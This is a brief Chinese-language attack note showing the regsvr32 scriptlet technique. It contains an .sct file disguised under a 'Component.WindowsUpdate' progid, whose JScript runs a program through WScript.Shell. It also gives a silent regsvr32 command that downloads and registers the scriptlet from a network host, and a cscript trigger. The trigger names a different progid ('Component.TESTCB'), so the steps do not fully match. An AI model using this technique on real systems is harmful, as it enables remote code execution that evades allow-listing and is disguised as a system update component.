	创建1.sct
```xml
<?XML version="1.0"?>
<scriptlet>
<registration
  description="Component"
  progid="Component.WindowsUpdate"
  version="1.00"
  classid="{20002222-0000-0000-0000-000000000002}"
>
</registration>
 
<public>
  <method name="exec">
  </method>
</public>
<script language="JScript">
  <![CDATA[
    function exec(){
      new ActiveXObject('WScript.Shell').Run('calc.exe');
    }
  ]]>
</script>
</scriptlet>

```
	创建COM对象
	>regsvr32.exe /s /i:http://192.168.0.107/1.sct scrobj.dll
	触发
	>cscript 1.js
	var test = new ActiveXObject("Component.TESTCB");
	test.exec()